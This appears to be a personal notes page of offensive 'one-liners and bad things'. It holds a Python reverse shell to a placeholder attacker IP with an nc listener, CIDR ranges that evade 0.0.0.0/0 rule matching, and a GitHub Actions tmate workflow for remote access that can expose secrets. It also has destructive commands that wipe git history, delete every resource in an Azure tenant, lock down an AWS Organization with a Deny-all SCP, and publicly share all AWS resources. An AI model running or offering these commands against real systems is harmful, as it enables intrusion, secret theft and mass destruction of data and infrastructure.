---
description: My favorite one-line commands
---

# One-liners and Bad Things

## Reverse Shell

The attacker machine must be public and exposed to the internet.

Run this on the attacker machine:

```
nc -lp 1337
```

Run this on the victim machine:

{% code overflow="wrap" %}
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("BAD_IP_ADDRESS_HERE",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

If you're in an environment that restricts security groups that match 0.0.0.0/0, chances are they are doing pattern matching and not reasoning about effective network access. You can create an EC2 instance with security groups matching these IP ranges and it will be **effectively the same as 0.0.0.0/0**:

```
1.0.0.0/8
2.0.0.0/7
4.0.0.0/6
8.0.0.0/5
16.0.0.0/4
32.0.0.0/3
64.0.0.0/2
128.0.0.0/1
```

### Reverse Shell in GitHub Actions

```
name: Reverse Shell Pentesting

on: workflow_dispatch

jobs:
  reverse-shell:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup tmate session
      uses: mxschmitt/action-tmate@v3
      timeout-minutes: 60
```

Run it and you'll see that it prints out an SSH command for you to connect with. You can add `env` to the "Setup tmate session" step to expose environment variables that are available to your GitHub actions workflow.

## Git

### Nuke Git commit history

```
git checkout --orphan newBranch; \ 
	git add -A; \                   # Add all files and commit them 
	git commit -m "Cleanup"; \
	git branch -D main; \           # Delete the main branch
	git branch -m main; \           # Rename the current branch to main
	git push -f origin main; \      # Force push main branch to GitHub
	git gc --aggressive --prune=all # Remove the old files
```

## Azure

### Delete all resources in an entire Azure Tenant

Bash variant:

```
#!/usr/bin/env bash

for sub in `az account list | jq -r '.[].id'`; do \
    for rg in `az group list --subscription $sub | jq -r '.[].name'`; do \
        az group delete --name ${rg} --subscription $sub --no-wait --yes; \
    done; done;
```

Terraform variant:

```
resource "null_resource" "nuke" {
  # Because we set this to timestamp, it *always* runs :D
  triggers = {
    party_like_its_jan_1_1970 = timestamp()
  }

  provisioner "local-exec" {
    command = <<EOF
for sub in `az account list | jq -r '.[].id'`; do \
    for rg in `az group list --subscription $sub | jq -r '.[].name'`; do \
        az group delete --name $rg --subscription $sub --no-wait --yes; \
    done; \
done;
EOF
  }
}
```

My post that explains the above is [here](https://kmcquade.com/2020/11/nuking-all-azure-resource-groups-under-all-azure-subscriptions/).&#x20;

## AWS

### Brick an entire AWS Organization using Deny \* SCPs

```
aws organizations attach-policy \
  --policy-id $(aws organizations create-policy --name pwn \
     --type SERVICE_CONTROL_POLICY \
     --description "pwn" 
     --content '{"Version": "2012-10-17","Statement": [{"Effect": "Deny", "Action": "*", "Resource": "*"}]}' \
    | jq ".Policy.PolicySummary.Id"\
    ) \
  --target-id $(aws organizations list-roots | jq ".Roots | .[0].Id")
```

### Share All Exposable Resources in an AWS Account with the internet 😈

```
endgame smash --service all --evil-principal "*"
```

## Other Resources

* [https://github.com/D4Vinci/One-Lin3r](https://github.com/D4Vinci/One-Lin3r): Gives you one-liners that aids in penetration testing operations, privilege escalation, and more.
